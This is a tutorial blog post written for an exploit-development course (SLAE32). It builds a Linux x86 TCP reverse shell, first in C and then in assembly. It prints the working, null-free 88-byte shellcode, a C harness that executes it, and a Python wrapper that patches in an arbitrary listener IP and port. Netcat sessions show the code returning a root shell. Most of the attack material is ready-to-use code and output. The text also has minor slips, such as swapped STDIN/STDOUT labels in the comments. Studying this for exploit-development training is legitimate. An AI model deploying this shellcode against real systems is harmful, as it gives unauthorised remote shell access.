---
title: "SLAE32 0x02: Shell_Reverse_TCP Shellcode"
date: 2019-10-25
category: [SLAE32]
tags: [assembly, c, python, exploit development, reverse shell, linux, SLAE32]
header:
    teaser: "/assets/images/slae/rev_shell.jpg"
---
In contrast to a bind shell (which is explained in the previous post), a reverse shell is a type of shell in which the system on which the code is run connects a TCP socket to a remote IP address and port that have been designated to listen for incoming connections prior to the execution of the reverse shell. In other words, when a reverse shell is used, the system on which the reverse shell is executed acts as the system that initiates the connection while the remote system acts as the listener. Upon succesful connection to the remote system, a shell will be spawned on the system on which the code is run.

As previously demonstrated, it is wise to begin by analyzing the code of a TCP reverse shell written using a higher level language. The C program shown in the upcoming section will be used for this purpose. It is worth nothing here that there are many similarities in code between the two TCP shell types, so references to the previous post will be common, and some previous explanations may be reused. The focus will lie on the major differences in code between the TCP bind shell and the TCP reverse shell.

Once analysis of the C program is complete, the program will be re-written using assembly. This processes is documented and explained in detail following the C code analysis.

The third section will demonstrate a program written in Python that allows a user to configure an IP address and port number to be used in the Shell_Reverse_TCP shellcode.

## Objectives
Create a Shell_Reverse_TCP shellcode that;
1. Connects to an easily configurable IP address and port number
2. Executes a shell on a successful connection

## Analysis of Shell_Reverse_TCP.c
The following code has been commented in a way that aims to break the program down into distinct sections to be referenced during analysis. If a section of code has already been explained previously, then either a reference to a previous explanation will be made, or the previous explanation will be reused within this post. A brief explanation will be provided for new concepts and/or functions.

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int main ()
{
    /* Create a TCP Socket */
    int sockfd = socket(AF_INET, SOCK_STREAM, 0); 

    /* Create an IP Address Pointer */
    const char* ip = "127.0.0.1";
    
    /* Create an IP Socket Address Structure */
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_aton(ip, &addr.sin_addr);

    /* Connect TCP Socket to IP Socket Address Structure */
    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    /* Direct Connection Socket Output */
    for (int i = 0; i < 3; i++)
    {   
        dup2(sockfd, i); 
    }   

    /* Execute Program */
    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

### Create a TCP Socket
`int socket(int domain, int type, int protocol);`

_Note from the author:_ This explanation has been reused from a previous post as the purpose of the function is the same in both cases.

First, a TCP socket is created using the `socket` function. As described in `man 2 socket`, the function creates an endpoint for communication and returns a file descriptor that refers to that endpoint. `socket` expects a domain argument, a type argument, and a protocol argument.

In this case, the domain argument `AF_INET` specifies the IPv4 communication protocol, the type argument `SOCK_STREAM` specifies the connection-based TCP standard for data exchange, and the protocol argument `0` indicates that the system should select the default protocol number based on the previously specified domain and protocol arguments.

### Create an IP Address Pointer
A pointer to the IP address of `127.0.0.1` is created which will later be used in the creation of the IP socket address structure `addr` which will ultimately determine where the reverse shell connection will terminate (i.e. the IP address of the remote listening host). The IP address of `127.0.0.1` is used for demonstration purposes, as this IP address is assigned to the loopback `lo` interface of the test system.

### Create an IP Socket Address Structure
This process is very similar to the process outlined in the analysis of the TCP bind shell C code, however there are a couple of important differences. In the case of the TCP reverse shell, the `addr` IP socket address structure is created for later use with the `connect` function. As further explained in `man 7 ip`, an IP socket address is defined as a combination of an IP interface address and a 16-bit (2 byte) port number. The man page also states that `sin_family` is always set to `AF_INET`, that `sin_port` defines a port number in network byte order. 

In the code above, the `htons` function converts the unsigned short integer `4444` from host byte order to network byte which is the format expected for `sin_port`. As detailed in `man inet_aton`, the `inet_aton` function is used to convert and store the IPv4 numbers-and-dots IP address of `127.0.0.1` into binary form (in network byte order). The first argument expected by `inet_aton` is a numbers-and-dots IPv4 address and the second argument is a pointer to a structure where the binary network byte order form of the IPv4 address should be stored (`sin_addr`, as expected by the `sockaddr` structure, in this case).

It is also important to note that the `addr` struct will be padded to the size of `struct sockaddr` (decimal `16`) as defined in the `/usr/include/linux/in.h` file. The `struct sockaddr` definition is shown below.

```c
/* Structure describing an Internet (IP) socket address. */
#if  __UAPI_DEF_SOCKADDR_IN
#define __SOCK_SIZE__   16      /* sizeof(struct sockaddr)  */
struct sockaddr_in {
  __kernel_sa_family_t  sin_family; /* Address family       */
  __be16        sin_port;   /* Port number          */
  struct in_addr    sin_addr;   /* Internet address     */

  /* Pad to size of `struct sockaddr'. */
  unsigned char     __pad[__SOCK_SIZE__ - sizeof(short int) -
            sizeof(unsigned short int) - sizeof(struct in_addr)];
};
#define sin_zero    __pad       /* for BSD UNIX comp. -FvK  */
#endif
```

### Connect TCP Socket to IP Socket Address Structure
`int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`

As detailed in `man connect`, the `connect` function is used to connect a socket specified by its file descriptor `sockfd` to an address specified by `addr`. In this case, `sockfd` is the file descriptor returned by the previous call to `socket` and `addr` is the IP socket address structure defined earlier.

As `sockfd` was initialized with the type `SOCK_STREAM`, the `connect` function attempts to connect the local `sockfd` to the remote socket that is bound to the remote system's IP address and port. The call to `connect` in a TCP reverse shell compared to the calls to `bind`, `listen` and `accept` in a TCP bind shell highlight a major difference between the two shell types.

### Direct Connection Socket Output
`int dup2(int oldfd, int newfd);`

_Note from the author:_ This explanataion is largely the same as an explanation from a previous post, however it should be noted that in the case of a TCP reverse shell, the first argument passed to `dup2` is the socket file descriptor `sockfd` as returned by `socket` as opposed to the `connfd` file descriptor as returned by `accept` in a TCP bind shell.

Next, a `for` loop is used to iterate over the `dup2` function three times, passing the values of `i = 0`, `i = 1`, and `i = 2` as the second argument expected by `dup2` during each respective iteration. The purpose of this is to direct data from the socket file descriptor `sockfd` which is passed as the first argument to `dup2` for each `for` loop iteration to `STDIN` (integer file descriptor `0`), `STDOUT` (integer file descriptor `1`), and `STDERROR` (integer file descriptor `2`).

### Execute Program
`int execve(const char *pathname, char *const argv[], char *const envp[]);`

_Note from the author:_ This explanation has been reused from a previous post as the purpose of the function is the same in both cases. One minor difference that will be reiterated here is that in a TCP reverse shell, `execve` is called after a connection to a remote system is made. In a TCP bind shell, `execve` is called after the system on which the code is running accepts a connection on a bound and listening address and port.

Finally, the `execve` function is called. The `execve` function executes the program pointed to by the first argument, `filename`. The second argument, `argv`, is a pointer to an array of argument strings that should be passed to `filename`. The final argument expected by `execve` is a pointer to an array of strings that are passed as environment to the newly-executed `filename` program. The `argv` and `envp` arguments must include a NULL pointer at the end of the array. Additionally, `argv[0]` should contain the filename assosicated with the program being executed (i.e. `filename`). In the analyzed program, the `/bin/sh` file will be executed with no additional arguments or environments being passed.

## From C to Shellcode
Now that the analysis of the TCP reverse shell C code is complete, it is easier to determine which system calls are necessary to create a functional TCP reverse shell in assembly. From analysis, it is clear that system calls will need to be made to the following functions in the following order:
1. `socket`
2. `connect`
3. `dup2`
4. `execve`

The mechanics of system calls in Linux x86 assembly were explained in an earlier post. To briefly reiterate, system calls are made through the `INT 0x80` software interrupt insruction. A system call number which will be in the `EAX` register before the `INT 0x80` instruction is encounter specifies the system call to be made. Each system call expects arguments which are most commonly passed through the `EBX`, `ECX`, and `EDX` registers.

In the sections following, the assembly code used to prepare for and execute the functions listed above will be explained. As the details of these functions and their purpose within a TCP reverse shell program were previously explained during the analysis of the C code, the following sections will focus on the assembly code used to prepare for and excute each function rather than on the purpose of the function within the program. Some of the assembly used for the TCP reverse shell is similar to the assembly used within the TCP bind shell explained in a previous post. These sections will be explained in less detail, as they have already been explained previously. The assembly code will come first, followed by the explanation of the code.

### Clear Registers
The assembly code starts by clearing the registers. This is done to prevent any inadvertent values from being passed as incorrect arguments to system calls. 

```nasm
; clear registers
xor ebx, ebx        ; clears EBX
mul ebx             ; clears EAX and EDX
```

Three registers are cleared using the two instructions shown above. First, the `EBX` register is cleared using `XOR`. As mentioned in another post, any `XOR` instruction with the same source and destination register will result in the register being cleared. Next, the `MUL` instruction is used to clear the `EAX` and `EDX` registers. `MUL` is used to multiply two 16-bit values within two registers. In the case of `MUL`, the destination operand is hard-coded as `AX` and the source operand is the register specified following the `MUL` instruction (`EBX` in this instance). That is to say, the `MUL EBX` instruction is multiplying the value in `AX` by the value in `EBX` which is `NULL`. Another property of `MUL` is that the result of the operation is stored across two registers; `AX` and `DX`. This is due to the fact that multiplying two 16-bit values can result in a 32-bit result which necessitates the use of two 16-bit registers.

Note that the `ECX` register is not cleared. This is because later in the code, a 32-bit value is moved into `ECX` and that move is the first time the register is used. Therefore, any value in `ECX` will be replaced and overwritten by new, 32-bit value.

### Socketcall System Call Explained
The `socketcall` system call is used in the TCP reverse shell for the first two functions mentioned above. As explained in a previous post, `socketcall` expects two arguments.

```shell
#include <linux/net.h>
int socketcall(int call, unsigned long *args);  
```

The `call` argument determines which socket function to use, and the `args` argument is a pointer to an area of memory that contains the arguments for the socket function specified by `call`. For a list of socket functions and their respective values that are passable as the `call` argument to `socketcall`, the `/usr/include/linux/net.h` file should be referenced. The available functions for `socketcall` are shown below. 

```shell
root@kali:~/workspace/SLAE# grep SYS /usr/include/linux/net.h
#define SYS_SOCKET      1               /* sys_socket(2)                */
#define SYS_BIND        2               /* sys_bind(2)                  */
#define SYS_CONNECT     3               /* sys_connect(2)               */
#define SYS_LISTEN      4               /* sys_listen(2)                */
#define SYS_ACCEPT      5               /* sys_accept(2)                */

```

From the `unistd_32.h` file, the system call number for `socketcall` is decimal `102`.

```shell
root@kali:~/workspace/SLAE# grep socketcall /usr/include/x86_64-linux-gnu/asm/unistd_32.h
#define __NR_socketcall 102
```

### Socketcall: Socket
_Note from the author:_ This section is almost exactly the same as the section of the same name in the discussion of the TCP bind shell. Additional explanation is included here regarding where `sockfd` is stored and the reasons why.

The first function from the analyzed C code that will be converted to assembly is the call to `socket`. The `socket` function expects three arguments as outlined in the analysis of the C code. The `socketcall` function expects the three arguments to `socket` to be passed as a pointer to its second argument. The `ESP` register stores the current memory address of the stack and therefore inherently acts as a pointer to an area of memory. 

```nasm
; Create a TCP Socket
; int socket(int domain, int type, int protocol);
; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
push edx            ; 0
push 0x1            ; 1 = SOCK_STREAM
push 0x2            ; 2 = AF_INET
```

Three `PUSH` instructions are used to move the three arguments for `socket` onto the stack, in reverse order. The corresponding values for `AF_INET` and `SOCK_STREAM` can typically be found in the `socket.h` file.

```nasm
; int socketcall(int call, unsigned long *args);
mov ecx, esp        ; *args
inc bl              ; 1 = sys_socket
mov al, 0x66        ; socketcall
int 0x80            ; returns int sockfd in eax
```

The "top" of the stack now contains the first argument for `socket`. The `ESP` register contains this memory address. This memory address is stored in the `ECX` register (which will be passed as the second argument to `socketcall`) using `MOV`. Next, `INC` is used to increase the value stored in `BL` by one to `1` which is passed as the first argument to `socketcall` and specifies calling the `socket` function. The system call number for `socketcall` is moved into `AL` and a software interrupt occurs.

```nasm
; Store int sockfd in ebx;
; reused in connect socketcall as 3 = sys_connect 
; reused in dup2 as int oldfd = sockfd = 3
mov ebx, eax
```

After an `INT 0x80`, the return value of the called function is stored in `EAX`. The last instruction shown above stores the file descriptor returned by `socket` (called `sockfd` in the C program) in `EBX` for future use. Note that the value returned for `sockfd` happens to be `0x3` in this case, which is later passed as the function number to `socketcall` for `connect` and then as `sockfd` to `dup2` as its first argument. The value of `0x3` remains in the `EBX` register until the call to `execve`.

### Create an IP Address Pointer
Now, the IP address of `127.0.0.1` is created for use in the IP socket address structure `addr` as the value pointed to by `sin_addr`. The 32-bit (4 byte) IP address can be represented in hexadecimal using the following bit of Python.

```python
>>> import socket
>>> def hex_inet_aton(ip_str):
...     ip_bytes = socket.inet_aton(str(ip_str))
...     ip_htonl = int.from_bytes(ip_bytes, "big")
...     return '0x' + '%08x' % socket.htonl(ip_htonl)
... 
>>> ip_str = "127.0.0.1"
>>> hex_inet_aton(ip_str)
'0x0100007f'
>>>
```

This shows that the value of IP address `127.0.0.1` represented in hexadecimal network byte order is `0x0100007f`. Normally, this value could be stored on the stack using `PUSH 0x0100007f`, however this will result in two `NULL` bytes in the resulting shellcode. To account for this, the `XOR` instruction is used, to return the value of `0x0100007f` in the `ECX` register without explicitly referencing it.

```nasm
; Create an IP Address Pointer
; const char* ip = "127.0.0.1";
mov edi, 0xffffffff ; 255.255.255.255
mov ecx, 0xfeffff80 ; 128.255.255.254
xor ecx, edi        ; 0x0100007f = 127.0.0.1
```

In this example, the value of `0xffffffff` which can be thought of in dot-decimal notation as `255.255.255.255` is moved into `EDI`. Now, the hexadecimal value of `0xfeffff80` is moved into `ECX`. This value can be thought of in dot-decimal notation as `128.255.255.254`. Notice that when `128.255.255.254` is "subtracted" from `255.255.255.255`, the "difference" is `127.0.0.1`.

Thinking of these values in binary allows for a more precise explanation of `XOR`. The `XOR` operation returns `TRUE` only when the compared bitwise values differ. In other words, on a bit-by-bit basis, any given bit in a specified destination register will return `1` if and only if the value of the respective (same) bit in the source and destination register at the time of the `XOR` operation are different. 

In the case of `0xffffffff`, all 32 binary bits are set to `1`. For `0xfeffff80`, each and every binary bit that _is not_ set to `1` in `0x0100007f` _is_ set to `1` in `0xfeffff80`. During the `XOR` operation, each bit in `EDI` (which contains `0xffffffff`) is compared to each bit in `ECX` (which contains `0xfeffff80`). As stated previously, the `XOR` operation will return `1` for each bit in the `ECX` destination register if and only if the compared bit values differ. Since all 32 bits _are_ set to `1` in `EDI`, and all bits that _are not_ set to `1` in `0x0100007f` _are_ set to `1` in `ECX`, the resulting value in `ECX` will be `0x0100007f`.

If `0x1000007f` represents the black within the `0x00000000` white of yin, then `0xfeffff80` is reflected as the equal-yet-opposite white within the `0xffffffff` black of yang. `0x1000007f` and `0xfeffff80` are opposite and complementary to one another as `0x00000000` and `0xffffffff` are. 

### IP Socket Address Structure
_Note from the author:_ This section is identical to the section of the same name from the explanation of a TCP bind shell with the exception of the `127.0.0.1` address pushed through `ECX` as opposed to the `0.0.0.0` address pushed through `EDX`.

Next, the IP socket address structure defined in the C program as `addr` is saved in memory. To accomplish this, the items will be stored on the stack using the `PUSH` instruction. 

```nasm
; Create an IP Socket Address Structure
; struct sockaddr_in addr;
push ecx            ; inet_aton("127.0.0.1", &addr.sin_addr);
push word 0x5c11    ; addr.sin_port = htons(4444);
push word 0x2       ; addr.sin_family = 2 = AF_INET;
mov ecx, esp        ; pointer to struct sockaddr_in addr;
```

First, the items are pushed to the stack in reverse order. Then, the memory address pointing to the item last pushed to the stack (which is contained in the `ESP` register) is moved to the `ECX` register to later be used as the second argument for `connect`.

### Socketcall: Connect System Call
With the memory address of the defined IP socket address structure stored in `ECX` and the socket file descriptor (`sockfd`) stored in `EBX`, the call to `connect` can now be prepared and executed. As the `socketcall` system call will again be used to call `connect`, the process for preparing the arguments for `connect` and for `socketcall` will be similar to the process outlined in the "Socketcall: Socket" section.

```nasm
; Connect TCP Socket to IP Socket Address Structure
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
push 0x10           ; 16 = sizeof(addr)
push ecx            ; (struct sockaddr *)&addr
push ebx            ; sockfd
```

First, the arguments for `connect` are stored on the stack in reverse order using the `PUSH` instruction. This time, the arguments stored on the stack consist of an integer that represents the size of `addr`, a pointer (memory address) to the location of the `addr` structure in memory, and the file descriptor returned by the `socket` function.

```nasm
; int socketcall(int call, unsigned long *args);
mov ecx, esp        ; *args
mov al, 0x66        ; socketcall   
int 0x80            ; returns 0 in eax
```

Next, the arguments for `socketcall` are prepared, this time with the intention of executing `connect`. As with the previous `socketcall`, the second argument is passed via the `ECX` register. To reiterate, as the three arguments expected by `connect` are stored on the stack, the `ESP` register will contain the memory address of where the first of these three arguments begins. Therefore, after the `MOV` instruction, the `ECX` register contains the memory address of where the three arguments for `connect` are stored. Recall from the "Socketcall: Socket" section that the value `0x3` is still stored in `EBX`. The value of `3` is the function number for `connect` and is passed to `socketcall` through `EBX` as the first argument. The system call number `0x66` (decimal `102`) is moved to the `AL` register before the sofware interrupt occurs and the system call is executed.

### Dup2 System Call
_Note from the author:_ Once again, this section is very similar to the "Dup2 System Call" section from the TCP bind shell explanation. The main difference is that in a TCP reverse shell, the file descriptor passed as the first argument to `dup2` each time is the socket file descriptor `sockfd` returned by `socket` ass opposed to the a connection file descriptor `confd` returned by`accept`.

The next system call required in the TCP reverse shell is `dup2` which is assigned the system call number decimal `63` in the `unistd_32.h` file.

```shell
#define __NR_dup2 63
```

As explained previously, `dup2` is used to direct `STDOUT`, `STDIN`, and `STDERROR` to the socket returned by `socket`. This means that the `dup2` system call will be repeated three times, one time for each standard stream. For each call, the `oldfd` argument will be the socket file descriptor `sockfd` that is currently stored in `EBX` and the `newfd` argument will first be `0` for `STDOUT`, then `1` for `STDERROR`, and finally `2` for `STDERROR`.

```nasm
; Direct Connection Socket Output
; int dup2(int oldfd, int newfd);
; dup2(sockfd, 0);
mov ecx, edx        ; 0 = STDOUT
mov al, 0x3f        ; dup2
int 0x80
; dup2(sockfd, 1);
inc cl              ; 1 = STDIN
mov al, 0x3f        ; dup2
int 0x80
; dup2(sockfd, 2);
inc cl              ; 2 = STDERROR
mov al, 0x3f        ; dup2
int 0x80
```

For the first call to `dup2`, the value of `0` is stored in the `ECX` register which will be passed to `dup2` as its second argument. Recall that the `sockfd` file descriptor is still in `EBX` and will be passed as the first argument to `dup2`. Then, the value `0x3f` which is the hexadecimal equivalent of the decimal representation of the system call number for `dup2` is moved into `AL` before the function is called via `INT 0x80`.

This general process is repeated two more times passing the values of `1` and `2` to the function's second argument each successive time. Note that the `sockfd` file descriptor remains in `EBX` throughout.

### Execve System Call
_Note from the author:_ The purpose of `execve` is the same in both TCP reverse and TCP bind shells. After further experimentation, however, it was discovered the value of `NULL` can be passed for the second and third arguments of `execve`. This is to say that `NULL` terminated pointers do not need to be created using `PUSH` instructions, as was demonstrated in the TCP bind shell cpde. In this case, `NULL` is passed via `ECX` and `EDX` for the second and third arguments of `execve`.

The final step is a system call to `execve` in order to execute `/bin/sh`. From `unistd_32.h` the system call number for `execve` is decimal `11`.

```shell
#define __NR_execve 11
```

The `execve` system call expects three arguments which were explained during the analysis of the C program that will be passed via the `EBX`, `ECX`, and `EDX` registers in the code below.

```nasm
; Execute Program
; int execve(const char *pathname, char *const argv[], char *const envp[]);
; execve("/bin/sh", NULL, NULL);
push edx            ; delimiting NULL for pathname; EDX is NULL for envp[]
push 0x68732f2f     ; //sh
push 0x6e69622f     ; /bin
mov ecx, edx        ; NULL for argv[]
mov ebx, esp        ; pointer to pathname
mov al, 0xb         ; execve
int 0x80
```

To prepare the three arguments for `execve`, the `/bin/sh` string is first stored on the stack using `PUSH` instructions. The first `PUSH` shown in the code above serves to `NULL` terminate the `/bin/sh` string. Note that `EDX` is `NULL` and will be passed as the third argument to `execve`. Next, the `/bin/sh` string itself is pushed to the stack. Then, the empty `EDX` register value is moved to `ECX` which will be passed as the second argument to `execve`. At this point, `ESP` stores the memory address of where the `/bin/sh` string is stored, and hence this memory address is moved to `EBX` which will be passed as the first argument for `execve`. The `execve` system call number is moved into `AL` before the software interrupt occurs.

## Completed Assembly Program
Shown below is the assembly program described above in its entirety. Some of the comments from the code above have been removed. The fully commented version of the code can be found on GitHub.

```nasm
; shell_reverse_tcp.nasm
; Author: Michael Norris

global _start

section .text
_start:
    ; clear registers
    xor edx, edx
    xor ecx, ecx
    xor ebx, ebx
    xor eax, eax

    ; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    push edx            ; 0
    push 0x1            ; 1 = SOCK_STREAM
    push 0x2            ; 2 = AF_INET
    mov ecx, esp        ; *args
    inc bl              ; 1 = sys_socket
    mov al, 0x66        ; socketcall
    int 0x80            ; returns int sockfd in eax
    
    ; Store int sockfd in ebx;
    mov ebx, eax
    
    ; const char* ip = "127.0.0.1";
    mov edi, 0xffffffff ; 255.255.255.255
    mov ecx, 0xfeffff80 ; 128.255.255.254
    xor ecx, edi        ; 0x0100007f = 127.0.0.1

    ; struct sockaddr_in addr;
    push ecx            ; inet_aton("127.0.0.1", &addr.sin_addr);
    push word 0x5c11    ; addr.sin_port = htons(4444);
    push word 0x2       ; addr.sin_family = 2 = AF_INET;
    mov ecx, esp        ; pointer to struct sockaddr_in addr;

    ; connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
    push 0x10           ; 16 = sizeof(addr)
    push ecx            ; (struct sockaddr *)&addr
    push ebx            ; sockfd
    mov ecx, esp        ; *args
    mov al, 0x66        ; socketcall   
    int 0x80            ; returns 0 in eax

    ; int dup2(int oldfd, int newfd);
    mov ecx, edx        ; 0 = STDOUT
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 1 = STDIN
    mov al, 0x3f        ; dup2
    int 0x80
    inc cl              ; 2 = STDERROR
    mov al, 0x3f        ; dup2
    int 0x80

    ; execve("/bin/sh", NULL, NULL);
    push edx            ; delimiting NULL for pathname; EDX is NULL for envp[]
    push 0x68732f2f     ; //sh
    push 0x6e69622f     ; /bin
    mov ecx, edx        ; NULL for argv[]
    mov ebx, esp        ; pointer to pathname
    mov al, 0xb         ; execve
    int 0x80
```

## Compile & Test
### Testing Assembly
The TCP reverse shell assembly code can be compiled and tested in the following manner. The commands used were run on 64-bit Kali Linux. To start, the code should be assembled with `/usr/bin/nasm` as shown below. As the program is written in x86 assembly, the `elf32` file type is specified using the `-f` flag.

```shell
root@kali:~/workspace/SLAE/# nasm -f elf32 shell_reverse_tcp.nasm -o shell_reverse_tcp.o
```

With the code assembled, the next step is to link the `shell_reverse_tcp.o` file with `/usr/bin/ld`. The `-m` flag specifies that the `elf_i386` emulation linker should be used.

```shell
root@kali:~/workspace/SLAE/# ld -m elf_i386 shell_reverse_tcp.o -o shell_reverse_tcp
```
Before `shell_reverse_tcp` is executed, a `nc` or `ncat` listener should be started in a separate terminal window which will be ready to accept the connection and shell spawned upon the successful connection of `shell_reverse_tcp`. The listening terminal will act as the "remote system" to which `shell_reverse_tcp` is specfied to connect in this demonstration. The command shown below instructs the remote system to listen for incoming connections on all interfaces, TCP port 4444.

```shell
root@kali:~/workspace/SLAE# nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

With a listener set up, `shell_reverse_tcp` can be run.

```shell
root@kali:~/workspace/SLAE# ./shell_reverse_tcp
```

In the listening terminal window, a connection is received.

```shell
root@kali:~/workspace/SLAE# nc -lvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:51190.
id 
uid=0(root) gid=0(root) groups=0(root)
ls | grep reverse
shell_reverse_tcp
shell_reverse_tcp.nasm
shell_reverse_tcp.o
```

Success!

### Examining The Shellcode
As `shell_bind_tcp` has been compiled and linked and is functioning as a standalone program, it should now be disassembled into opcodes using `/usr/bin/objdump` for further examination. Using the command shown below, the operation codes can be examined for any `NULL` characters. The output has been truncated to conserve space.

```shell
root@kali:~/workspace/SLAE# objdump -d ./shell_reverse_tcp -M intel

./shell_reverse_tcp:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:       31 db                   xor    ebx,ebx
 8049002:       f7 e3                   mul    ebx
 8049004:       52                      push   edx
 8049005:       6a 01                   push   0x1
 8049007:       6a 02                   push   0x2
 8049009:       89 e1                   mov    ecx,esp
 804900b:       fe c3                   inc    bl
 804900d:       b0 66                   mov    al,0x66
 804900f:       cd 80                   int    0x80
 8049011:       89 c3                   mov    ebx,eax
...
```

 After confirming that no `NULL` bytes (`\x00`) are present in the output of `objdump`, the shellcode can be extracted and formatted using the one-liner command demonstrated in the TCP bind shell writeup. The resulting shellcode is shown below.

 ```shell
 \x31\xdb\xf7\xe3\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\xbf\xff\xff\xff\xff\xb9\x80\xff\xff\xfe\x31\xf9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x89\xd1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80
 ```

### Testing The Shellcode
To confirm that the shellcode will work within the context of a C program, the shellcode can be placed in a test program (titled `sc_test.c` in this example) written in C, as shown below.

```c
#include <stdio.h>
#include <string.h>

/*
To compile:
gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
*/

unsigned char shellcode[] = \
    "\x31\xdb\xf7\xe3\x52\x6a\x01\x6a"
    "\x02\x89\xe1\xfe\xc3\xb0\x66\xcd"
    "\x80\x89\xc3\xbf\xff\xff\xff\xff"
    "\xb9\x80\xff\xff\xfe\x31\xf9\x51"
    "\x66\x68\x11\x5c\x66\x6a\x02\x89"
    "\xe1\x6a\x10\x51\x53\x89\xe1\xb0"
    "\x66\xcd\x80\x89\xd1\xb0\x3f\xcd"
    "\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe"
    "\xc1\xb0\x3f\xcd\x80\x52\x68\x2f"
    "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    "\x89\xd1\x89\xe3\xb0\x0b\xcd\x80";

int main(void)
{
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
```

The above program is compiled using the command shown below, as suggested in the commented program code.

```shell
root@kali:~/workspace/SLAE# gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
```

Before `sc_test` is executed, a `nc` or `ncat` listener should once again be set up in a seperate terminal window to act as the remote system to which the reverse shell should connect to, as previously explained in the "Testing Assembly" section of this post. Once the listener is configured, running `sc_test` once again results in a shell on the system, which confirms that the shellcode works in the context of a C program.

The length of the TCP reverse shell shellcode is 88; a whopping 21 bytes shorter than the 109 byte-length TCP bind shell shellcode!

```shell
root@kali:~/workspace/SLAE/assignments/0x02# ./sc_test
Shellcode Length: 88
```

## Wrapper Program for IP & Port Configuration
The remote IP address and the remote port to be included in the TCP reverse shell shellcode can be configured using the Python program explained below. The wrapper program configured in the last section of the previous post has been modified to include reverse shell shellcode, and the functionality to configure a remote IP address and port for the target system to connect to. The output below shows the usage options of the program.

```shell
root@kali:~/workspace/SLAE/assignments/0x02# python3 ConfShell.py 
[*] Usage: python3 ConfShell.py bind [BIND_PORT]
[*] Usage: python3 ConfShell.py reverse [IP] [LISTEN_PORT]
```

The reverse shell shellcode as explained in this post has been added as the reverse shell payload that the Python program will modify, and is shown below for reference.

```shell
 \x31\xdb\xf7\xe3\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\xbf\xff\xff\xff\xff\xb9\x80\xff\xff\xfe\x31\xf9\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x89\xd1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80
 ```

 The functionality that provides the user to specifiy a port works the same as explained in the previous post, so it will not be explained again here. For more detail on how the port configuration works within the program, reference the previous post. Similar logic was used to replace the hardcoded complementary hexadecimal remote IP address specified within the shellcode above (`\x80\xff\xff\xfe`). Note that as the `XOR` operation is used in calculating the remote IP address, the address that is complentary to the `XOR` value of the IP address appears in the shellcode as opposed to the remote address itself (i.e. `\x80\xff\xff\xfe` is `128.255.255.254` which has all bits set that `127.0.0.1` or `\x80\xff\xff\xfe` do not have set). To save space, the program code has not been included here. The full code for the program can be found on [GitHub](https://github.com/norrismw/SLAE).

A demonstration of the IP address and port configuration functionality of the wrapper program for the reverse shell shellcode follows. As seen below, the system with the IP address `192.168.57.1` will receive the connection from the reverse shell shellcode which will generated using the wrapper program.

```shell
SLAE-1469-MacBook-Pro:~ SLAE-1469$ ifconfig | grep 192.168.57.1
    inet 192.168.57.1 netmask 0xffffff00 broadcast 192.168.57.255
```

Once generated, the reverse shell shellcode will be run on the system with the IP address of `192.168.57.246`, as represented below.

```shell
root@kali:~/workspace/SLAE/assignments/0x02# ifconfig | grep 192.168.57
    inet 192.168.57.246  netmask 255.255.255.0  broadcast 192.168.57.255
```

The following output shows the usage of the wrapper program and specifies the reverse shell shellcode, the IP address of 192.168.57.1 and the port of 4455 to which the reverse shell should connect.

```shell
root@kali:~/workspace/SLAE/assignments/0x02# python3 ConfShell.py reverse 192.168.57.1 4455
\x31\xdb\xf7\xe3\x52\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\xbf\xff\xff\xff\xff\xb9\x3f\x57\xc6\xfe\x31\xf9\x51\x66\x68\x11\x67\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xb0\x66\xcd\x80\x89\xd1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\xfe\xc1\xb0\x3f\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80
```

This output can then be used in `sc_test.c` as outlined previously. After compiling the new shellcode within `sc_test.c`, a `nc` listener is set to listen on port `4455` on the system to which the reverse shell will connect (`192.168.57.1`).

```shell
SLAE-1469-MacBook-Pro:~ SLAE-1469$ nc -lvp 4455
```

The `sc_test` binary is now ready to be executed on the `192.168.57.246` system.

```shell
root@kali:~/workspace/SLAE/assignments/0x02# ./sc_test
Shellcode Length: 88

```

